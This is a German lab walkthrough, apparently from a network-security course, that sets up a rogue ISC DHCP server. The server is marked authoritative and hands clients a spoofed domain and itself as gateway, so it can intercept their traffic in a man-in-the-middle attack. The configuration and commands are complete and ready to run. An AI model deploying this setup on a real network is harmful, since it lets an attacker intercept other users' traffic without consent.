# 6 Konfiguration Rogue DHCP
Die Installation des DHCP Servers findet auf der virtuellen Maschine "i40" statt, erfolgt jedoch analog zur Installation des für das Netzwerk authorativen DHCP Servers.

## Installation
```bash
apt install isc-dhcp-server
```

## Konfiguration
DHCP Server Konfiguration in der Datei ```/etc/dhcp/dhcpd.conf```. Zur besseren Darstellung stellt der Rogue DHCP Server eine DHCP Range von 10.0.0.100-10.0.253 bereit.
```bash
default-lease-time 600;
max-lease-time 7200;
ddns-update-style none;
authoritative;

subnet 10.0.0.0 netmask 255.255.255.0 {
	range 10.0.0.100 10.0.0.253;
	option subnet-mask 255.255.255.0;
	option domain-name-servers 10.0.0.1;
	option domain-name "i40-spoofed.lan";
	option routers 10.0.0.254;
	ddns-domainname "i40-network.lan";
	ddns-rev-domainname "0.0.10.in-addr.arpa.";
}
```

Bereitstellung der Konfigurationsdatei und Binden des Servers auf ein Interface in ```/etc/default/isc-dhcp-server```.
```bash
DHCPDv4_CONF=/etc/dhcp/dhcpd.conf
DHCPDv4_PID=/var/run/dhcpd.pid
INTERFACESv4="enp0s8"
```

## Start
Anschließend kann der DHCP Server gestartet werden:

```bash
systemctl start isc-dhcp-server
```

Bei der Konfiguration des Netzwerks neuer Clients sowie dem Neubezug der Netzwerkkonfiguration wird der Rogue DHCP Server aufgrund des Delays des authorativen DHCP Servers schneller antworten und somit seine Konfiguration verteilen. Diese Konfiguration beinhaltet sich selbst als Gateway, um den Netzwerkverkehr anderer Netzwerkteilnehmer in andere Netze untersuchen und eine MitM Attacke durchführen zu können.